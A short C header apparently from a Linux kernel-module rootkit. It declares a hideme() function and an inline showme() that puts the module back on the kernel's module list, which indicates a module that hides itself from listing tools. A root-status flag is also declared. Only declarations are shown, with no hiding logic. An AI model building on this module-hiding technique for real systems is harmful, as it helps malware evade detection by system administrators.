#ifndef _HIDE_LKM_H
#define _HIDE_LKM_H

extern struct list_head *prev_ent;
static short flag = 0;
static short amiroot = 0;

static inline void showme(void) { list_add(&THIS_MODULE->list, prev_ent); }

void hideme(void);
#endif
